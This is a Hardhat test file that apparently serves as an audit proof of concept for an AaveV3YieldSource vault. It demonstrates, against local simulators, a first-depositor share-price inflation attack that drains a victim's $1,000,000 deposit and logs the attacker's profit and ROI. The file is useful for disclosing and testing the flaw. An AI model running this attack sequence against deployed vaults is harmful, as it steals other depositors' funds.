import { Signer } from '@ethersproject/abstract-signer';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

import { expect } from 'chai';
import { BigNumber } from 'ethers';
import { MockContract } from 'ethereum-waffle';
import { network, ethers, waffle } from 'hardhat';

import {
  AaveV3YieldSourceHarness,
  AaveV3YieldSourceHarness__factory,
  ATokenSimulator,
  ERC20Mintable,
  PoolSimulator,
  YieldSourceExploiter
} from '../types';

import IAToken from '../abis/IAToken.json';
import IRewardsController from '../abis/IRewardsController.json';
import IPool from '../abis/IPool.json';
import IPoolAddressesProvider from '../abis/IPoolAddressesProvider.json';
import IPoolAddressesProviderRegistry from '../abis/IPoolAddressesProviderRegistry.json';
import SafeERC20Wrapper from '../abis/SafeERC20Wrapper.json';

const { constants, getContractFactory, getSigners, utils } = ethers;
const { AddressZero, MaxUint256 } = constants;
const { parseEther: toWei, parseUnits } = utils;

const DECIMALS = 6;
const REFERRAL_CODE = 188;

describe('AaveV3YieldSource', () => {
  let contractsOwner: Signer;
  let yieldSourceOwner: SignerWithAddress;
  let wallet2: SignerWithAddress;
  let attacker: SignerWithAddress;

  let rewardsController: MockContract;
  let pool: PoolSimulator;
  let poolAddressesProvider: MockContract;
  let poolAddressesProviderRegistry: MockContract;

  let aaveV3YieldSource: AaveV3YieldSourceHarness;
  let yieldExploiter: YieldSourceExploiter

  let usdcToken: ERC20Mintable;
  let aToken: ATokenSimulator;

  let constructorTest = false;

  const deployAaveV3YieldSource = async (
    aTokenAddress: string,
    rewardsControllerAddress: string,
    poolAddressesProviderRegistryAddress: string,
    decimals: number,
    owner: string,
  ): Promise<AaveV3YieldSourceHarness> => {
    const AaveV3YieldSource = (await ethers.getContractFactory(
      'AaveV3YieldSourceHarness',
    )) as AaveV3YieldSourceHarness__factory;

    return await AaveV3YieldSource.deploy(
      aTokenAddress,
      rewardsControllerAddress,
      poolAddressesProviderRegistryAddress,
      'PoolTogether aUSDC Yield',
      'PTaUSDCY',
      decimals,
      owner,
    );
  };

  beforeEach(async () => {
    const { deployMockContract } = waffle;

    [contractsOwner, yieldSourceOwner, wallet2, attacker] = await getSigners();

    const ERC20MintableContract = await getContractFactory('ERC20Mintable', contractsOwner);

    usdcToken = (await ERC20MintableContract.deploy('USD Coin', 'USDC', 6)) as ERC20Mintable;

    const aTokenSimulator = await getContractFactory('aTokenSimulator', contractsOwner);

    //Deploy my own aToken
    aToken = (await aTokenSimulator.deploy('aToken', 'aToken', 18, usdcToken.address)) as ATokenSimulator;

    const PoolSimulator = await getContractFactory('PoolSimulator', contractsOwner);

    pool = (await PoolSimulator.deploy(usdcToken.address, aToken.address)) as PoolSimulator;

    //Start pool off with a bunch of tokens (I am cheating)
    await usdcToken.mint(pool.address, BigNumber.from(10).pow(60));
    await aToken.mint(pool.address, BigNumber.from(10).pow(60));

    rewardsController = await deployMockContract(contractsOwner, IRewardsController);

    poolAddressesProvider = await deployMockContract(contractsOwner, IPoolAddressesProvider);

    poolAddressesProviderRegistry = await deployMockContract(
      contractsOwner,
      IPoolAddressesProviderRegistry,
    );

    await poolAddressesProvider.mock.getPool.returns(pool.address);
    await poolAddressesProviderRegistry.mock.getAddressesProvidersList.returns([
      poolAddressesProvider.address,
    ]);

    aaveV3YieldSource = await deployAaveV3YieldSource(
      aToken.address,
      rewardsController.address,
      poolAddressesProviderRegistry.address,
      DECIMALS,
      yieldSourceOwner.address,
    );

    await aToken.forciblySetApproval(aaveV3YieldSource.address, pool.address, MaxUint256)

    //Deploy exploiter
    const YieldSoExploiter = await getContractFactory('YieldSourceExploiter', attacker);
    yieldExploiter = (await YieldSoExploiter.deploy(attacker.address, aaveV3YieldSource.address, aToken.address, usdcToken.address)) as YieldSourceExploiter;
  });

  describe('PoolTogether vulnerabilities', () => {
    //For this test I assume USDC has 18 decimals rather than 6. I'm pretty sure it works either way; just making it easier on myself.
    it('allows easy pool draining if an early depositor ramps up the share price, then rug pulls', async () => {
      //Here are some adjustable qualities to play around with:
      const ATTACKER_STARTING_INVESTMENT_IN_DOLLARS = 10000   //Attacker risks this amount to pull off the exploit. Their only risk is that someone else exploits it before they can.
      const POOL_SIZE_IN_DOLLARS = 1000000                    //The pool size (outside of attacker) is $1,000,000


      let USDC_DECIMALS = BigNumber.from(10).pow(DECIMALS);

      //Convert attacker starting investment to USDC
      const ATTACK_INIT_DEPOSIT = BigNumber.from(10).pow(DECIMALS).mul(ATTACKER_STARTING_INVESTMENT_IN_DOLLARS)
      //The attacker needs enough to pay for initial deposit + initial share mint, i.e. startingInvestment + $0.00002
      const ATTACKER_STARTING_BAL = ATTACK_INIT_DEPOSIT.add(2)  
      await usdcToken.mint(attacker.address, ATTACKER_STARTING_BAL)

      //Prepare for attack
      await usdcToken.connect(attacker).transfer(yieldExploiter.address, 2)
      await usdcToken.connect(attacker).approve(pool.address, MaxUint256)
      await pool.connect(attacker).supply(usdcToken.address, ATTACK_INIT_DEPOSIT, yieldExploiter.address, 4)

      //Run this as soon as the aaveV3YieldSource is deployed, before any other shares have been minted
      await yieldExploiter.firstDeposit(ATTACK_INIT_DEPOSIT)    
      
      //Now some poor sap deposits the pool money
      const USER_STARTING_BAL = BigNumber.from(10).pow(DECIMALS).mul(POOL_SIZE_IN_DOLLARS)
      await usdcToken.mint(wallet2.address, USER_STARTING_BAL)
      await usdcToken.connect(wallet2).approve(aaveV3YieldSource.address, MaxUint256)
      await aaveV3YieldSource.connect(wallet2).supplyTokenTo(USER_STARTING_BAL, wallet2.address)

      // Iterate exploit until price / share goes below $0.50 or we run out of gas.
      // If pool size is large and/or attacker investment is small, it makes sense to run iterateExploit more than once, but we'll 
      // just stick with once for now.
      await yieldExploiter.iterateExploit(500000)

      //Withdraw earnings from contract
      await yieldExploiter.withdrawFunds()

      //Results
      let profit = (await usdcToken.balanceOf(attacker.address)).sub(ATTACKER_STARTING_BAL)
      console.log('Initial investment:  $', ATTACK_INIT_DEPOSIT.div(USDC_DECIMALS).toString())
      console.log('Profit per run:      $', profit.div(USDC_DECIMALS).toString())
      console.log('Profit / iteration:  $', profit.div(200).div(USDC_DECIMALS).toString())
      console.log('Pool holdings stolen per run: $', profit.mul(100).div(USER_STARTING_BAL).toString(), '%')
      console.log('Exploit ROI (profit / initial investment): ', profit.mul(100).div(ATTACK_INIT_DEPOSIT).toString(), `%`)
    })
  })
})